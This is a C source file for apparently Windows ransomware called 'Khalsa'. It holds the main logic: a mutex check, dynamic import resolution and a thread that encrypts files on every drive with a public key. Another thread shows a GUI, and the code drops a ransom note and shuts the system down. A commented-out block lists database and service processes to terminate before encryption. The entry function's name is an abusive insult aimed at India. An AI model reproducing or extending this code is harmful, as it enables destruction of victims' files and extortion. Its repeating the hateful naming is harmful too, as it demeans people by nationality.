#include "khalsa_main.h"
#include "khalsa_resolve.h"

BOOL ScanAndEncrypt() {

    PKHALSA_SCAN_CONFIG lpParam = _HeapAlloc(_GetProcessHeap(), 0, sizeof(KHALSA_SCAN_CONFIG));
    lpParam->lpszExts = lpszExts;
    lpParam->lpszBlacklist = lpszBlacklist;

    ScanDrives(OnFindDrive_Encrypt, lpParam);
    return _HeapFree(_GetProcessHeap(), 0, lpParam);


}
DWORD WINAPI CryptMain(LPVOID lpParam) {
    UNREFERENCED_PARAMETER(lpParam);
    
    BOOL rv = FALSE;
    rv = InitalizeCrypto(lpszPublicKey);

    if (rv) { 
        rv = ScanAndEncrypt();
        rv = DeInitalizeCrypto();
    } 

    DropReadMe(lpszMessage);
    return rv;
}
BOOL KhalsaCreateMutex(LPCWSTR lpszMutantName, PHANDLE phMutant) {
    HANDLE hMutant = INVALID_HANDLE_VALUE;
    UNICODE_STRING usMutantName;
    OBJECT_ATTRIBUTES ObjAttr;
    _RtlInitUnicodeString(&usMutantName, lpszMutantName);
    InitializeObjectAttributes(&ObjAttr, &usMutantName, 0, NULL, NULL);
    NTSTATUS status = _NtCreateMutant(&hMutant, MUTEX_ALL_ACCESS, &ObjAttr, 0);
    if (status == STATUS_OBJECT_NAME_COLLISION) {
        return FALSE;
    }
    *phMutant = hMutant;
    return NT_SUCCESS(status);
}

BOOL ProgramMain() {
    BOOL status = FALSE, bMelted = FALSE;
    HANDLE hMutant = INVALID_HANDLE_VALUE;            
    HANDLE hThread[2]; 
    hThread[0] = INVALID_HANDLE_VALUE;
    hThread[1] = INVALID_HANDLE_VALUE;
    status = KhalsaCreateMutex(lpszMutantName, &hMutant);
    if (status)
    {
         
        //status = MeltFile(&bMelted);
        if (status) {
            OBJECT_ATTRIBUTES CryptAttributes, GUIAttributes;
            InitializeObjectAttributes(&CryptAttributes, NULL, 0, NULL, NULL);
            InitializeObjectAttributes(&GUIAttributes, NULL, 0, NULL, NULL);
            //CryptMain(NULL);
            _RtlCreateUserThread(NtCurrentProcess(), NULL, FALSE, 0, 0, 0, (LPTHREAD_START_ROUTINE)CryptMain, NULL, &hThread[0], NULL);
            _RtlCreateUserThread(NtCurrentProcess(), NULL, FALSE, 0, 0, 0, (LPTHREAD_START_ROUTINE)CreateGUIThread , NULL, &hThread[1], NULL);
            _NtWaitForMultipleObjects(2, hThread, WaitAllObject, FALSE, NULL);
            _NtClose(hThread[0]);
            _NtClose(hThread[1]);
            SystemShutdown();
        }
    }
    if (hMutant != INVALID_HANDLE_VALUE) {
        _NtClose(hMutant);
    }
    return status;
}


int indiacangofuckitself() {


    ResolveImports();
   /*LPWSTR lpszBlacklist[] = { 
      L"regedit.exe",   L"msftesql.exe", L"sqlagent.exe", L"sqlbrowser.exe", L"sqlservr.exe", L"sqlwriter.exe", L"oracle.exe", L"ocssd.exe", L"dbsnmp.exe", L"synctime.exe", L"mydesktopqos.exe", L"agntsvc.exeisqlplussvc.exe", L"xfssvccon.exe", L"mydesktopservice.exe", L"ocautoupds.exe", L"agntsvc.exeagntsvc.exe", L"agntsvc.exeencsvc.exe", L"firefoxconfig.exe", L"tbirdconfig.exe", L"ocomm.exe", L"mysqld.exe", L"mysqld-nt.exe", L"mysqld-opt.exe", L"dbeng50.exe", L"sqbcoreservice.exe",
         NULL };
    Khalsa_IsWindowOpen(lpszBlacklist);
    */
    ProgramMain();
    return 0;
}
